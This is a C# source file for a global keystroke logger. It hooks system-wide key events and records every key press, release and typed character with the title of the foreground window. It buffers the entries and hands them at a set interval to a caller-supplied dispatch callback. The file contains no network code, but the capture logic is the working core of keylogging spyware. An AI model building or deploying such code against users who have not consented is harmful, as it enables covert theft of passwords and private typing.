using System;
using System.Linq;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Windows.Forms;


namespace Logger.Keyboard
{
    using WindowHandle = IntPtr;
    
    /// <summary>
    /// Logs keyboard events globally.
    /// </summary>
    class KeyboardLogger
    {
        private const int MaxTitleSize = 300;
        private const int InitialStackSize = 5000, MaxStackSize = 80000,  nLogsPreservedOnStackTrim = 8000;

        private readonly int dispatchInterval;
        private readonly object dispatchSyncObj = new object();
        private KeyboardListener listener;
        private Stack<Keylog> stack;
        private readonly object stackSyncObj = new object();
        private System.Threading.Timer dispatchTimer;
        private Func<IEnumerable<Keylog>, bool> OnDispatch;

        static string Escape(string text)
        {
            text = text.Replace("[", "[[");
            text = text.Replace("]", "]]");
            return text;
        }

        public KeyboardLogger(KeyboardListener listener, int dispatchIntervalMilliseconds, Func<IEnumerable<Keylog>, bool> OnDispatch)
        {
            this.listener = listener;
            this.stack = new Stack<Keylog>(InitialStackSize);
            this.OnDispatch = OnDispatch;
            this.dispatchInterval = dispatchIntervalMilliseconds;
            this.dispatchTimer = new System.Threading.Timer(new TimerCallback(DispatchTimerElapsed), null, dispatchIntervalMilliseconds, dispatchIntervalMilliseconds);
            
            this.listener.KeyDown += new RawKeyEventHandler(OnKeyDown);
            this.listener.KeyUp += new RawKeyEventHandler(OnKeyUp);
        }

        public void Flush()
        {
            TryDispatch();
        }

        private void OnKeyDown(object sender, RawKeyEventArgs args)
        {
            try
            {
                var keyRepresentation = args.Key.ToString();
                var keyDownLog = string.Format("[{0} down]", Escape(keyRepresentation));

                this.EnqueueLog(keyDownLog);

                if (!string.IsNullOrEmpty(args.Character))
                    this.EnqueueLog(args.Character);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void OnKeyUp(object sender, RawKeyEventArgs args)
        {
            try 
            {
                var keyRepresentation = args.Key.ToString();
                var keyUpLog = string.Format("[{0} up]", Escape(keyRepresentation));

                this.EnqueueLog(keyUpLog);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void EnqueueLog(string log)
        {
            WindowHandle windowHandle = WinAPI.GetForegroundWindow();

            StringBuilder windowTitle = new StringBuilder(MaxTitleSize);
            WinAPI.GetWindowText(windowHandle, windowTitle, MaxTitleSize);

            var keylog = new Keylog(log, windowHandle, windowTitle.ToString());

            lock (stackSyncObj)
                this.stack.Push(keylog);

            TrimStackIfNecessary();
        }

        private void TrimStackIfNecessary()
        {
            lock (stackSyncObj)
            {
                if (this.stack.Count <= MaxStackSize)
                    return;
            
                var preservedLogs = new Stack<Keylog>(stack.Take(nLogsPreservedOnStackTrim));

                if (preservedLogs.Count < InitialStackSize)
                    this.stack = new Stack<Keylog>(InitialStackSize);
                else
                    this.stack = new Stack<Keylog>(preservedLogs.Count * 2);

                foreach (var item in preservedLogs)
                    this.stack.Push(item);
            }
        }

        private void DispatchTimerElapsed(object obj)
        {
            TryDispatch();
            ResetDispatchTimer();
        }

        private void ResetDispatchTimer()
        {
            this.dispatchTimer.Change(this.dispatchInterval, this.dispatchInterval);
        }

        private void TryDispatch()
        {
            lock (stackSyncObj)
            {
                int amount = stack.Count;

                if (amount <= 0)
                    return;

                bool success = OnDispatch(stack.Take(amount));

                if (success)
                {
                    for (int i = 0; i < amount; i++)
                        stack.Pop();
                }
            }
        }
    }
   
    class Keylog
    {

        string log;
        string windowTitle;
        WindowHandle windowHandle;

        public string Log
        {
            get { return this.log; }
        }

        public string WindowTitle
        {
            get { return this.windowTitle; }
        }

        public WindowHandle WindowHandle
        {
            get { return this.windowHandle; }
        }

        public Keylog (string log, WindowHandle windowHandle, string windowTitle)
        {
            this.log = log;
            this.windowHandle = windowHandle;
            this.windowTitle = windowTitle;
        }
    }
}
